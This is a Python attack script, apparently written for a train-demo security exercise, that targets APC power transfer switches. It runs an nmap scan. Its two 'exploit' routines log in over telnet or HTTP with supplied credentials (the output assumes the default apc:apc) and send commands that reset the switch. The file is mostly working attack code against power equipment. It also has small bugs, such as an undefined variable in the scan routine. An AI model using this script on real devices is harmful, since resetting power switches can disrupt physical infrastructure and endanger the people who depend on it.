#A script to reset the APS Power Transfer Switch, used as part of the train demo aka Project D.A.R.T. (Damn, a real train).
#Written by Paul Oates

#TODO
#Scan entire network for APC devices.

import requests
from pyfiglet import Figlet
import time
import nmap
import socket
import re
import os
import random

def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
def prCyan(skk): print("\033[96m {}\033[00m" .format(skk))


#url="http://192.168.1.20"


def recon(ip):
    nm = nmap.PortScanner()
    prGreen('[*] Running active scan...')
    host = nm.scan(ip, arguments='-O -sV')
    
    print('\n')
    prGreen("[+] OS: "+host['scan'][IP]['osmatch'][0]['name'])
    prGreen('===========================')
    #print(host['scan'][IP]['tcp'])
    for port in host['scan'][IP]['tcp']:
        prGreen('[+] Port Number: ' +str(port))
        prGreen('[+] State: '+host['scan'][IP]['tcp'][port]['state'])
        prGreen('[+] Service: '+host['scan'][IP]['tcp'][port]['name'])
        prGreen('[+] Product: '+host['scan'][IP]['tcp'][port]['product'])
        print('\n')

def exploit_telnet(ip, username,password):
    IP = ip
    PORT = 23
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        print('[*] Creating socket connection to: '+IP+":"+str(PORT))
        time.sleep(1)
        s.connect((IP,PORT))

        
        prGreen('[+] Getting data from server...')

        res = s.recv(2048)
        res = res + s.recv(2048)
        #time.sleep(1)
        #print(res)
        if res==b'\xff\xfb\x01\n\rUser Name : ':
            prGreen('[+] Sending username to socket...')
            time.sleep(1)

            for c in username:
                s.sendall(c.encode('UTF-8'))
                s.recv(100)
            s.sendall(b'\r')
            s.recv(100)

            prGreen('[+] Sending password to socket...')
            time.sleep(1)
            for c in password:
                s.sendall(c.encode('UTF-8'))
                s.recv(100)
            s.sendall(b'\r')

            full_res=b''
            time.sleep(1)
            while (1):
                res = s.recv(2048)
                #print(b'\n'+res)
                full_res = full_res+res
                #time.sleep(1)
                if b'\r\n>' in res:
                    prGreen('[+] Login successful (apc:apc)!!\n[+] Server sent back menu, sending commands to reset the switch...')
                    time.sleep(2)
                    break

            s.sendall(b'1')
            s.recv(100)  
            s.sendall(b'\r')  
            while (1):
                res = s.recv(2048)
                full_res = full_res+res
                if b'\r\n>' in res:
                    break    
            
            s.sendall(b'4')
            s.recv(100)  
            s.sendall(b'\r')  
            while (1):
                res = s.recv(2048)
                full_res = full_res+res
                if b'\r\n>' in res:
                    break    

            s.sendall(b'1')
            s.recv(100)  
            s.sendall(b'\r')  
            while (1):
                res = s.recv(2048)
                full_res = full_res+res
                if b':' in res:
                    break 

            time.sleep(2)
            s.sendall(b'Y')
            s.recv(100)            
            s.sendall(b'E')
            s.recv(100) 
            s.sendall(b'S')
            s.recv(100) 
            s.sendall(b'\r')  
            while (1):
                res = s.recv(2048)
                full_res = full_res+res
                time.sleep(1)
                if b'Press <ENTER> to continue...' in res:
                    prGreen('[+] Reset successful... break anything good? :^)')
                    break    

        s.close()

def exploit_http(ip, username,password):
    #Logon
    data = {
    'login_username': ''+username+'',
    'login_password': ''+password+'',
    'submit': 'Log On',
    }
    response = requests.post('http://'+ip+'/Forms/login1', data=data)
    pattern = r'\/([a-zA-Z0-9]+)\/home\.htm'
    match = re.search(pattern, response.url)
    print(response.url)
    if match:
        token = match.group(1)
        prGreen("[+] Logged in and obtained token: "+token)
    else:
        prRed("[-] Logon probably failed - is someone else already logged on?")
        return
    time.sleep(1)

    #Reset Switch
    data = {
    'controlaction': '1',
    'submit': 'Apply',
    }
    prGreen('[+] Reseting switch!!')
    time.sleep(1)
    response = requests.post('http://'+ip+'/NMC/'+token+'/Forms/control1', data=data)
    time.sleep(1)
    
    #Logout
    logout_url='http://'+ip+'/NMC/'+token+'/logout.htm'
    response = requests.get(logout_url)
    if 'You are now logged off.' in response.text:
        prGreen('[+] Logged out.')


def print_banner():
    fonts = ['alligator','alligator2','basic','big','block','chunky','colossal','cosmic','epic','isometric1','larry3d']
    banner = Figlet(font=random.choice(fonts),width=1000)
    prCyan(banner.renderText('D . A . R . T .'))

def print_menu():
    os.system('clear')
    print_banner()

    prGreen('1) Recon')
    prGreen('2) Exploit (telnet)')
    prGreen('3) Exploit (http)')
    prRed('0) Exit')

    print('Enter your option: ')
    i = int(input())

    if i == 1:
        ip = str(input("Enter IP of device: "))
        recon(ip)
        input("Press any key to return to menu...")
    elif i==2:
        ip = str(input("Enter IP of device: "))
        username = str(input('Enter username: '))
        password = str(input('Enter password: '))
        exploit_telnet(ip,username,password)
    elif i==3:
        ip = str(input("Enter IP of device: "))
        username = str(input('Enter username: '))
        password = str(input('Enter password: '))
        exploit_http(ip,username,password)
    elif i==0:
        exit()
    else:
        print("Invalid input, try again.")
    
    print_menu()

def main():
    print_menu()


if __name__ == "__main__":
    main()